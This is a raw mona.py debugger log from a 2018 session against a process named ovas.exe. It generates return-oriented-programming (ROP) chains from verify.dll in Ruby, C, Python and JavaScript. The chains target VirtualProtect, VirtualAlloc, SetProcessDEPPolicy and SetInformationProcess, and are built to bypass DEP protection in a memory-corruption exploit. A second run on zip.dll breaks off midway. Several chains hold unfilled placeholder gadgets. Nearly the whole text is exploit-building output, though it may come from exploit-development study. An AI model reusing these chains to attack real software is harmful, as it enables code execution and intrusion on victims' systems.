0BADF00D  [+] Command used:
0BADF00D  !mona rop -m verify.dll
          
          ---------- Mona command started on 2018-10-30 04:42:40 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules verify.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module verify.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 3
0BADF00D         Ending : RETN, Nr found : 131
0BADF00D      - Filtering and mutating 134 gadgets
0BADF00D        - Progress update : 100 / 134 items processed (Tue 2018/10/30 04:42:46 AM) - (74%)
0BADF00D        - Progress update : 134 / 134 items processed (Tue 2018/10/30 04:42:47 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:42:48 AM: Step 1/7: esi
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:42:49 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:42:50 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:42:50 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:42:50 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:42:50 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:42:50 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:42:50 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:42:51 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:42:51 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:42:51 AM: Step 1/7: esi
0BADF00D      Tue 2018/10/30 04:42:52 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:42:52 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:42:52 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:42:52 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:42:52 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:42:52 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d304d9d,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [verify.dll] 
                0x6d30428f,  # PUSH EAX # SUB AL,5F # POP ESI # RETN [verify.dll] 
                0x6d30683a,  # POP EBP # RETN [verify.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d305cf1,  # POP EBX # RETN [verify.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
                0x6d304784,  # POP ECX # RETN [verify.dll] 
                0x6d309c6f,  # &Writable location [verify.dll]
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3057c4,  # RETN (ROP NOP) [verify.dll]
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x6d3024ae,  // POP EAX // RETN [verify.dll] 
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d304d9d,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [verify.dll] 
                0x6d30428f,  // PUSH EAX // SUB AL,5F // POP ESI // RETN [verify.dll] 
                0x6d30683a,  // POP EBP // RETN [verify.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d305cf1,  // POP EBX // RETN [verify.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x00000000,  // [-] Unable to find gadget to put 00000040 into edx
                0x6d304784,  // POP ECX // RETN [verify.dll] 
                0x6d309c6f,  // &Writable location [verify.dll]
                0x6d3044e0,  // POP EDI // RETN [verify.dll] 
                0x6d3057c4,  // RETN (ROP NOP) [verify.dll]
                0x6d3024ae,  // POP EAX // RETN [verify.dll] 
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d304d9d,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [verify.dll] 
                0x6d30428f,  # PUSH EAX # SUB AL,5F # POP ESI # RETN [verify.dll] 
                0x6d30683a,  # POP EBP # RETN [verify.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d305cf1,  # POP EBX # RETN [verify.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
                0x6d304784,  # POP ECX # RETN [verify.dll] 
                0x6d309c6f,  # &Writable location [verify.dll]
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3057c4,  # RETN (ROP NOP) [verify.dll]
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u24ae%u6d30" + // 0x6d3024ae : ,# POP EAX # RETN [verify.dll] 
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u4d9d%u6d30" + // 0x6d304d9d : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [verify.dll] 
              "%u428f%u6d30" + // 0x6d30428f : ,# PUSH EAX # SUB AL,5F # POP ESI # RETN [verify.dll] 
              "%u683a%u6d30" + // 0x6d30683a : ,# POP EBP # RETN [verify.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u5cf1%u6d30" + // 0x6d305cf1 : ,# POP EBX # RETN [verify.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00000040 into edx
              "%u4784%u6d30" + // 0x6d304784 : ,# POP ECX # RETN [verify.dll] 
              "%u9c6f%u6d30" + // 0x6d309c6f : ,# &Writable location [verify.dll]
              "%u44e0%u6d30" + // 0x6d3044e0 : ,# POP EDI # RETN [verify.dll] 
              "%u57c4%u6d30" + // 0x6d3057c4 : ,# RETN (ROP NOP) [verify.dll]
              "%u24ae%u6d30" + // 0x6d3024ae : ,# POP EAX # RETN [verify.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find gadget to put 00000022 into edx
                0x6d304e23,  # POP ECX # RETN [verify.dll] 
                0x6d300124,  # &0x00000002 [verify.dll]
                0x6d3015ee,  # POP EBX # RETN [verify.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3044e0,  # skip 4 bytes [verify.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  // [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  // [-] Unable to find gadget to put 00000022 into edx
                0x6d304e23,  // POP ECX // RETN [verify.dll] 
                0x6d300124,  // &0x00000002 [verify.dll]
                0x6d3015ee,  // POP EBX // RETN [verify.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x6d3024ae,  // POP EAX // RETN [verify.dll] 
                0x00000004,  // 0x00000004-> eax
                0x6d3044e0,  // POP EDI // RETN [verify.dll] 
                0x6d3044e0,  // skip 4 bytes [verify.dll]
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find gadget to put 00000022 into edx
                0x6d304e23,  # POP ECX # RETN [verify.dll] 
                0x6d300124,  # &0x00000002 [verify.dll]
                0x6d3015ee,  # POP EBX # RETN [verify.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3044e0,  # skip 4 bytes [verify.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &SetInformationProcess()
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00000022 into edx
              "%u4e23%u6d30" + // 0x6d304e23 : ,# POP ECX # RETN [verify.dll] 
              "%u0124%u6d30" + // 0x6d300124 : ,# &0x00000002 [verify.dll]
              "%u15ee%u6d30" + // 0x6d3015ee : ,# POP EBX # RETN [verify.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u24ae%u6d30" + // 0x6d3024ae : ,# POP EAX # RETN [verify.dll] 
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%u44e0%u6d30" + // 0x6d3044e0 : ,# POP EDI # RETN [verify.dll] 
              "%u44e0%u6d30" + // 0x6d3044e0 : ,# skip 4 bytes [verify.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d3042df,  # POP EBX # RETN [verify.dll] 
                0x6d30c6b0,  # &0x00000000 [verify.dll]
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3044e0,  # skip 4 bytes [verify.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d3042df,  // POP EBX // RETN [verify.dll] 
                0x6d30c6b0,  // &0x00000000 [verify.dll]
                0x6d3044e0,  // POP EDI // RETN [verify.dll] 
                0x6d3044e0,  // skip 4 bytes [verify.dll]
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d3042df,  # POP EBX # RETN [verify.dll] 
                0x6d30c6b0,  # &0x00000000 [verify.dll]
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3044e0,  # skip 4 bytes [verify.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u42df%u6d30" + // 0x6d3042df : ,# POP EBX # RETN [verify.dll] 
              "%uc6b0%u6d30" + // 0x6d30c6b0 : ,# &0x00000000 [verify.dll]
              "%u44e0%u6d30" + // 0x6d3044e0 : ,# POP EDI # RETN [verify.dll] 
              "%u44e0%u6d30" + // 0x6d3044e0 : ,# skip 4 bytes [verify.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d304d9d,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [verify.dll] 
                0x6d30428f,  # PUSH EAX # SUB AL,5F # POP ESI # RETN [verify.dll] 
                0x6d30644d,  # POP EBP # RETN [verify.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d3024fa,  # POP EBX # RETN [verify.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x6d304e23,  # POP ECX # RETN [verify.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3057c4,  # RETN (ROP NOP) [verify.dll]
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x6d3024ae,  // POP EAX // RETN [verify.dll] 
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d304d9d,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [verify.dll] 
                0x6d30428f,  // PUSH EAX // SUB AL,5F // POP ESI // RETN [verify.dll] 
                0x6d30644d,  // POP EBP // RETN [verify.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d3024fa,  // POP EBX // RETN [verify.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x00000000,  // [-] Unable to find gadget to put 00001000 into edx
                0x6d304e23,  // POP ECX // RETN [verify.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x6d3044e0,  // POP EDI // RETN [verify.dll] 
                0x6d3057c4,  // RETN (ROP NOP) [verify.dll]
                0x6d3024ae,  // POP EAX // RETN [verify.dll] 
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d304d9d,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [verify.dll] 
                0x6d30428f,  # PUSH EAX # SUB AL,5F # POP ESI # RETN [verify.dll] 
                0x6d30644d,  # POP EBP # RETN [verify.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d3024fa,  # POP EBX # RETN [verify.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x6d304e23,  # POP ECX # RETN [verify.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x6d3044e0,  # POP EDI # RETN [verify.dll] 
                0x6d3057c4,  # RETN (ROP NOP) [verify.dll]
                0x6d3024ae,  # POP EAX # RETN [verify.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u24ae%u6d30" + // 0x6d3024ae : ,# POP EAX # RETN [verify.dll] 
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u4d9d%u6d30" + // 0x6d304d9d : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [verify.dll] 
              "%u428f%u6d30" + // 0x6d30428f : ,# PUSH EAX # SUB AL,5F # POP ESI # RETN [verify.dll] 
              "%u644d%u6d30" + // 0x6d30644d : ,# POP EBP # RETN [verify.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u24fa%u6d30" + // 0x6d3024fa : ,# POP EBX # RETN [verify.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00001000 into edx
              "%u4e23%u6d30" + // 0x6d304e23 : ,# POP ECX # RETN [verify.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u44e0%u6d30" + // 0x6d3044e0 : ,# POP EDI # RETN [verify.dll] 
              "%u57c4%u6d30" + // 0x6d3057c4 : ,# RETN (ROP NOP) [verify.dll]
              "%u24ae%u6d30" + // 0x6d3024ae : ,# POP EAX # RETN [verify.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 106 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 75 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (229 interesting gadgets)
0BADF00D      Wrote 229 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (285 gadgets)
0BADF00D      Wrote 285 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:11.969000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m zip.dll
          
          ---------- Mona command started on 2018-10-30 04:45:10 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules zip.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module zip.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 5
0BADF00D         Ending : RETN 0x1C, Nr found : 2
0BADF00D         Ending : RETN, Nr found : 123
0BADF00D         Ending : RETN 0x18, Nr found : 4
0BADF00D         Ending : RETN 0x08, Nr found : 7
0BADF00D         Ending : RETN 0x28, Nr found : 1
0BADF00D         Ending : RETN 0x10, Nr found : 17
0BADF00D         Ending : RETN 0x14, Nr found : 5
0BADF00D      - Filtering and mutating 164 gadgets
0BADF00D        - Progress update : 100 / 164 items processed (Tue 2018/10/30 04:45:12 AM) - (60%)
0BADF00D        - Progress update : 164 / 164 items processed (Tue 2018/10/30 04:45:13 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:45:14 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d320000 to 0x6d32d000
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:45:15 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:45:37 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:45:37 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:45:37 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:45:37 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:45:37 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:45:37 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:45:38 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:45:38 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:45:38 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d320000 to 0x6d32d000
0BADF00D      Tue 2018/10/30 04:45:39 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:45:40 AM: Step 3/7: ebx
